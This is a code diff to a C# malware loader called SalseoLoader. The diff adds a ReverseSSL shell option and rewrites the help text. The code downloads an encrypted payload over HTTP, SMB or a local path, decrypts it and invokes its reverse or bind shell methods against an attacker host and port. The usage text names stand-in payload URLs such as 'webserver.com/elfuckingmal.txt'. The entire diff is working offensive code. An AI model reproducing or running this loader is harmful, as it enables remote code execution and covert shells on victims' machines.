@@ -77,15 +77,25 @@ namespace SalseoDecrypter
 
             if (args.Length <= 3)
             {
+            	string ayuda = @"
+[+] Usage:
+
+    [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt ReverseTCP LHOST LPORT
+    [-] SalseoLoader.exe password \\smbserver.com\evil\elfuckingmal.txt ReverseUDP LHOST LPORT
+    [-] SalseoLoader.exe password c:\temp\elfuckingmal.txt ReverseICMP LHOST
+    [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt ReverseDNS LHOST ServerDNS
+    [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt BindTCP LHOST LPORT
+    [-] SalseoLoader.exe password c:\temp\elfuckingmal.txt ReverseSSL LHOST LPORT
+    
+[+] Shells availables:
+
+    [-] ReverseTCP  [-] ReverseDNS   [-] ReverseSSL
+    [-] ReverseUDP  [-] ReverseICMP  [-] BindTCP
+
+";
                 // Ayuda();
                 Console.ForegroundColor = ConsoleColor.Gray;
-                Console.WriteLine("[+] Usage:\n");
-                Console.WriteLine("    [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt ReverseTCP LHOST LPORT");
-                Console.WriteLine("    [-] SalseoLoader.exe password \\\\smbserver.com\\evil\\elfuckingmal.txt ReverseUDP LHOST LPORT");
-                Console.WriteLine("    [-] SalseoLoader.exe password c:\\temp\\elfuckingmal.txt ReverseICMP LHOST");
-                Console.WriteLine("    [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt ReverseDNS LHOST ServerDNS");
-		Console.WriteLine("    [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt BindTCP LHOST LPORT");
-                Console.WriteLine("\n[+] Shells availables:\n\n    [-] ReverseTCP\n    [-] ReverseUDP\n    [-] ReverseDNS\n    [-] ReverseICMP\n    [-] BindTCP\n");
+				Console.WriteLine(ayuda);
                 System.Environment.Exit(1);
 
             }
@@ -98,11 +108,11 @@ namespace SalseoDecrypter
             byte[] xKey = Encoding.ASCII.GetBytes(clave);
             string Salseo_URL = args[1].ToString();
             string funcion = args[2].ToString().ToLower();
-            if (funcion == "reversetcp") { if (args.Length < 5) { Console.WriteLine("\n[-] Necesitas introducir un puerto :("); Environment.Exit(1); } }
+            if (funcion == "reversetcp" || funcion == "reversessl" ) { if (args.Length < 5) { Console.WriteLine("\n[-] Necesitas introducir un puerto :("); Environment.Exit(1); } }
             if (funcion == "reverseudp") { if (args.Length < 5) { Console.WriteLine("\n[-] Necesitas introducir un puerto :("); Environment.Exit(1); } }
             if (funcion == "reversedns") { if (args.Length < 5) { Console.WriteLine("\n[-] Necesitas introducir un nombre de dominio :("); Environment.Exit(1); } }
             if (funcion == "reverseicmp") { if (args.Length < 4) { Console.WriteLine("\n[-] Necesitas introducir un puerto :("); Environment.Exit(1); } }
-            if (funcion != "reversetcp" & funcion != "reversedns" & funcion != "reverseicmp" & funcion != "reverseudp" & funcion != "bindtcp") { Console.WriteLine("\n[-] Error en el tipo de shell :("); Environment.Exit(1); }
+            if (funcion != "reversetcp" & funcion != "reversedns" & funcion != "reverseicmp" & funcion != "reverseudp" & funcion != "bindtcp" & funcion != "reversessl") { Console.WriteLine("\n[-] Error en el tipo de shell :("); Environment.Exit(1); }
             Console.ForegroundColor = ConsoleColor.Gray;
             if (args[1].ToString().Substring(0, 4).ToLower() == "http") { Salseo_Encriptado = ClienteWeb.LeePayload(args[1].ToString()); }
             if (args[1].ToString().Substring(0, 2).ToLower() == "\\\\") { Console.WriteLine("[+] Leyendo datos via SMB..."); if (System.IO.File.Exists(Salseo_URL) == false) { Console.WriteLine("[-] Error: No se pudo leer el payload ¿ La ruta es correcta ?"); Environment.Exit(1); } Salseo_Encriptado = LeeArchivoSMBorLocal.Archivo(args[1].ToString()); }
@@ -135,6 +145,16 @@ namespace SalseoDecrypter
                 string[] argumentos = new string[] { LHOST + " " + LPORT };
                 Type myType = salsongo.GetTypes()[0];
                 MethodInfo Method = myType.GetMethod("reversetcp");
+                object myInstance = Activator.CreateInstance(myType);
+                Method.Invoke(myInstance, new object[] { argumentos });
+            }
+            if (funcion == "reversessl")
+            {
+                string LHOST = args[3].ToString();
+                string LPORT = args[4].ToString();
+                string[] argumentos = new string[] { LHOST + " " + LPORT };
+                Type myType = salsongo.GetTypes()[0];
+                MethodInfo Method = myType.GetMethod("reversessl");
                 object myInstance = Activator.CreateInstance(myType);
                 Method.Invoke(myInstance, new object[] { argumentos });
             }
